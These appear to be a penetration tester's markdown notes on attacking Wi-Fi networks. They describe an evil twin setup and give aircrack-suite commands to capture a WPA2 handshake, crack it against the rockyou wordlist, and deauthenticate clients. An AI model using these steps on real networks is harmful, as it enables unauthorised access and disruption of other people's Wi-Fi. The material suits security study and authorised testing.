# Notes on wireless pentesting

## Evil Twin attack (WPA2-EAP)

Create a network with the same BSSID as the target and wait for someone to authenticate with the target network's credentials. Users who have auto-connect enabled may connect to the evil twin automatically if the evil twin is closer to the user than the target access point.

- WiFi Pineapple (hardware)
    - https://shop.hak5.org/products/wifi-pineapple

- EAPHammer
    - https://github.com/s0lst1c3/eaphammer

---

## Capturing a WPA2-PSK handshake

```bash
# sets the interface to monitor mode
# wlan0 => wlan0mon
$ airmon-ng start wlan0

# displays the nearby access points
$ airodump-ng wlan0mon

# displays all the Wi-Fi clients that are connected to the access point and
# captures the handshake and store it to wpa_log file
$ airodump-ng --bssid <ACCESS_POINT_MAC_ADDR> --channel 1 -w wpa_log wlan0mon
```

## Crack the password

```bash
# dictionary attack (aircrack-ng)
$ aircrack-ng wpa_log-01.cap -w /usr/share/wordlists/rockyou.txt

# customize the seclists (airgeddon)
$ TBA
```

---

## Deauthentication

Deauthenticate users from an access point to make them reconnect. This creates the possibility to capture a handshake or to make the user connect to an evil twin.

```bash
# 0 means deauthentication (--deauth)
# 1 is the number of deauths to send
# -a sets the MAC address of the access point
# -c sets the MAC address of the client you are deauthing
# wlan0 is the interface name
$ aireplay-ng -0 1 -a <MAC_ADDR> -c <MAC_ADDR> wlan0
```

---